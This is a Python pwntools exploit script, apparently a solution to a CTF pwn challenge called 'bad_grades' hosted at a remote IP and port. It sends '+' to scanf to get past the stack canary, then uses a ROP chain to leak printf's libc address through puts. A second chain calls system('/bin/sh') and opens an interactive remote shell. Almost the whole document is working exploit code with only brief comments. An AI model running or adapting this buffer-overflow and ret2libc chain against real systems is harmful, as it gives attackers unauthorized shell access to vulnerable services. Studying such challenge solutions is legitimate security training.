#!/usr/bin/env python3

from pwn import *
from struct import unpack

exe = ELF("./bad_grades_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.62.195", 37488)

    return r

def bytes2double(b: bytes) -> str:
    return str(unpack("<d", b)[0])


def main():
    r = conn()
    rop = ROP(exe)

    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret     = rop.find_gadget(["ret"])[0]
    exe.symbols["main"] = 0x401108

    # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", b"39")

    for _ in range(33):
        r.sendlineafter(b": ", b"0.0")

    # Canary (putting a chars does not write anything 'cuz scanf() can't parse a char into an integer).
    # NOTE: For some reasons other characters besides '+', '-' and '.' causes the program to not read the
    #       next input so it's better to put valid numerical symbols.
    r.sendlineafter(b": ", b"+")

    # RBP
    r.sendlineafter(b": ", b"1.0")

    # ROP Chain
    r.sendlineafter(b": ", bytes2double(p64(pop_rdi)))
    r.sendlineafter(b": ", bytes2double(p64(exe.got["printf"])))
    r.sendlineafter(b": ", bytes2double(p64(exe.symbols["puts"])))
    r.sendlineafter(b": ", bytes2double(p64(exe.symbols["main"])))

    libc.address = u64(r.recvlines(2)[-1].ljust(8, b"\x00")) - libc.symbols["printf"]
    log.warn(f"LIBC Address: 0x{libc.address:x}")

    # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", b"42")

    for _ in range(33):
        r.sendlineafter(b": ", b"0.0")

    # Canary (putting a chars does not write anything 'cuz scanf() can't parse a char into an integer).
    # NOTE: For some reasons other characters besides '+', '-' and '.' causes the program to not read the
    #       next input so it's better to put valid numerical symbols.
    r.sendlineafter(b": ", b"+")

    # RBP
    r.sendlineafter(b": ", b"1.0")

    # ROP Chain (system("/bin/sh") + clean exit)
    r.sendlineafter(b": ", bytes2double(p64(pop_rdi)))
    r.sendlineafter(b": ", bytes2double(p64(next(libc.search(b"/bin/sh")))))
    r.sendlineafter(b": ", bytes2double(p64(ret)))
    r.sendlineafter(b": ", bytes2double(p64(libc.symbols["system"])))
    r.sendlineafter(b": ", bytes2double(p64(pop_rdi)))
    r.sendlineafter(b": ", bytes2double(p64(0)))
    r.sendlineafter(b": ", bytes2double(p64(libc.symbols["exit"])))

    log.success("Shell successfully spawned!")
    r.clean()
    r.interactive("$ ")


if __name__ == "__main__":
    main()
